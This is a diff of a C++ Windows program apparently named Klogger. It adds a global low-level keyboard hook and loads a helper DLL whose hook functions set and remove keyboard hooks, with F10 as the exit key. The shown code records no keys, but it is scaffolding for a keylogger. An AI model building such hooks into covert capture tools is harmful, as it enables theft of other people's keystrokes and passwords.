@@ -2,17 +2,26 @@
 #include "Klogger.h"
 #include "console.h"
 
+#define KLOG_DEBUG	//console 的调试开关
 
-#define KLOG_DEBUG
+typedef VOID(_stdcall* LPFNDLLFUNC)(VOID);
+typedef INT(_stdcall* LPFNDLLFUNC1)(INT, INT);
+
+static HHOOK hKBHook = 0;
+static LPFNDLLFUNC lpfnDllUnHook = 0;
+static 	HMODULE hHookDll;
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+
+
+
+
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 	_In_opt_ HINSTANCE hPrevInstance,
 	_In_ LPWSTR    lpCmdLine,
 	_In_ int       nCmdShow)
-{
-	USES_CONVERSION;
-	
-	HMODULE hHookDll;
+{	
+
 	TCHAR currentDir[MAX_PATH];
 	std::exception mException;
 
@@ -20,50 +29,41 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 	console_init();
 #endif
 
-	GetCurrentDirectory(MAX_PATH, currentDir);	//get当前的路径
 	
+
+	if (!(hKBHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardProc, NULL, 0)))
+	{
+		MessageBox(NULL, L"Failed to install KB hook!", L"Error", MB_ICONERROR);
+	}
+
+	GetCurrentDirectory(MAX_PATH, currentDir);	//get当前的路径
 	DebugPrint(currentDir);
 
 	try
 	{
 		hHookDll = LoadLibrary(L"./KDLL.dll");
-		
 
-		
 		if (hHookDll)
-		{	
-			typedef VOID(_stdcall* LPFNDLLFUNC)(VOID);
-			typedef INT(_stdcall* LPFNDLLFUNC1)(INT, INT);
-
-			DebugPrint(L"DLL loaded!");
-
-			//INT(_stdcall *appFunc)(INT, INT); //这里定义一个函数指针，也可以通过 typedef 定义新类型
-
-			LPFNDLLFUNC lpfnDllFunc = (LPFNDLLFUNC) GetProcAddress(hHookDll, "fnSetKbHook");
+		{
+			DebugPrint(L"DLL loaded! \n");
+		
+			LPFNDLLFUNC lpfnDllSetHook = (LPFNDLLFUNC) GetProcAddress(hHookDll, "fnSetKbHook");
+			lpfnDllUnHook = (LPFNDLLFUNC) GetProcAddress(hHookDll, "fnRemoveKbHook");
 			
-			//LPFNDLLFUNC lpfnDllFunc = (LPFNDLLFUNC)GetProcAddress(hHookDll,
-			//										LPCSTR(MAKEINTRESOURCE(2)));
-
+			DebugPrint(L"%d", (int)lpfnDllUnHook);
+			//INT(_stdcall *appFunc)(INT, INT); //这里定义一个函数指针，也可以通过 typedef 定义新类型
 			//获得动态库函数指针
 			//(FARPROC&)appFunc = GetProcAddress(hHookDll, LPCSTR(MAKEINTRESOURCE(1)));
 
-			if (lpfnDllFunc)
+			if (lpfnDllSetHook)
 			{
-
-				//TCHAR retBuf[16] = { 0 };
-				//INT ret = appFunc(5, 3);				
-				//wsprintf(retBuf, L"%d", ret);	//用之前成了sprintf 导致乱码
-				//MessageBox(NULL, retBuf, L"warning", MB_OK);
-
-				lpfnDllFunc();
+				lpfnDllSetHook();
 			}
 			else
 			{
 				DebugPrint(L"invalid Function Pointer!");
 				throw mException;
 			}
-
-			FreeLibrary(hHookDll);	//这里释放 DLL 文件
 		}
 		else
 		{
@@ -85,6 +85,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 		MessageBox(GetDesktopWindow(), L"Load DLL FAILED", L"warning",  MB_OK);
 	}
 				
+
 	MSG msg;	//保持应用运行 (保持句柄这样DLL 不会被回收)
 	while (GetMessage(&msg, 0, 0, 0))
 	{
@@ -96,3 +97,39 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 #ifndef KLOG_DEBUG
 #endif
 }
+
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	
+	if (nCode >= 0)
+	{
+		// the action is valid: HC_ACTION.
+		if (wParam == WM_KEYDOWN)
+		{
+			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
+			KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+
+			switch (kbdStruct.vkCode)
+			{
+			case VK_F10:				//程序退出快捷键
+				
+				//MessageBox(GetDesktopWindow(), L"F10", L"info", NULL);
+				DebugPrint(L"%d", (int)lpfnDllUnHook);
+
+				lpfnDllUnHook();
+				FreeLibrary(hHookDll);	//这里释放 DLL 文件
+
+				exit(0);
+				break;
+			default:
+				break;
+			}
+			
+		}
+	}
+	
+	
+	return CallNextHookEx(hKBHook, nCode, wParam, lParam); //要把消息传到下一个钩子 ，不然键盘就没用了！
+
+}
+
